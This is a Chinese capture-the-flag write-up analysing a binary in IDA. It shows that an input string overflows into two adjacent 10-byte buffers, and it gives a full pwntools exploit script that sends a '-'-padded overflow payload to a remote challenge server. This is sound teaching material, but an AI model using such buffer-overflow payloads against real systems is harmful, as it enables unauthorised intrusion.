先丢进IDA，F5，分析运行过程。
程序先生成了3个随机数并输出，然后需要输入一个字符串s：
[img](https://qqadapt.qpic.cn/txdocpic/0/290c61463224077f5064b2eb6502952b/0)
之后验证s中是否只包含数字字符和负号：
[img](https://qqadapt.qpic.cn/txdocpic/0/4de09b6f6c6c0701fe28259b0ffe8b0f/0)
然后把s,nptr,v15中的字符串使用atoi()转换成整数v9,v10,v11，并满足3个if中的条件即可得到flag：
[img](https://qqadapt.qpic.cn/txdocpic/0/c1370db5b51b9ba16b871e3443fe3408/0)
虽然我们只输入了字符串s，但观察发现s,nptr,v15是相连的，可以通过写s写穿到其他两个变量中，3个变量大小都为10字节：
[img](https://qqadapt.qpic.cn/txdocpic/0/f251a9493d3a53d1bd7ecdd7e6311c70/0)
接下来就是解方程，求出v9,v10,v11，然后填到s中并传输。
这里有个坑，由于需要通过s直接写到nptr,v15，这说明3个变量实际上是没有‘\0’这种分隔符的，一旦调用atoi(s)，就会把后面的数据也读取到s中。因此要考虑怎么分隔3个变量。既然它限制了输入只能是数字字符和负号，数字显然不能分隔，这样只能是用负号把剩下的空间填充。
exp:
```python
from pwn import *

def change(num):
	num=str(num)
	return num+(10-len(num))*'-'

#io=process("./challenge1")
io=remote("159.89.166.12",9800)

io.recvuntil(":)\n")
x=io.recvuntil(";")
x=x[0:len(x)-1]
y=io.recvuntil(";")
y=y[0:len(y)-1]
z=io.recvuntil(";")
z=z[0:len(z)-1]

x=int(x)
y=int(y)
z=int(z)

a=(z-y+x)/2
b=(x+y-z)/2
c=(y-x+z)/2

a=change(a)
b=change(b)
c=change(c)

io.sendline(a+b+c)
io.interactive()
```
得到flag：
[img](https://qqadapt.qpic.cn/txdocpic/0/4c53f160dc7ebc9bbe85104435ab05d9/0)